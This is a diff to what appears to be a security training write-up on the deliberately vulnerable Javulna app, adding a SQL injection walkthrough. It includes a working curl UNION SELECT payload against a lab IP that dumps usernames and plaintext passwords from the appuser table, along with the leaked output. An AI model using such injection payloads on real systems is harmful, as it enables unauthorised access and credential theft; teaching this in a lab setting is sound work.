@@ -136,11 +136,32 @@ Notice that each `json` element returned looks like this:
     "genre":""}
 ```
 
-We now know three things:
+We now know five things:
 
 - There's a SQLi vulnerability.
 - We can inject using the `title` parameter.
 - We can use a `UNION` statement to fill the four values in the `json` elements.
+- We know the user table where the credentials are stored.
+- The credentials are stored in plain text!
+
+Given this information we can use the following manual exploit to get a valid account to log in with:
+
+```
+curl "http://10.10.0.120:8080/rest/movie?title='+UNION+SELECT+password,'',name,id+FROM+appuser;--"
+```
+
+The output shows the results (
+some data omitted for brevity):
+
+```json
+[
+    {"id":"2","title":"","description":"IamYourFather","genre":"Darth Vader"},
+    {"id":"3","title":"","description":"IwishIhaveChoosenTheWookieInstead","genre":"Princess Leia"},
+    {"id":"1","title":"","description":"NoSecretsATrueJediHas","genre":"Yoda"}
+]
+```
+
+We can use any of these accounts to log in to the web application. We could do some brute forcing to find the login API but most web applications would document this anyway. Within Javulna this is at `/login`.
 
 ## Java Deserialization Vulnerability Leading to RCE
 
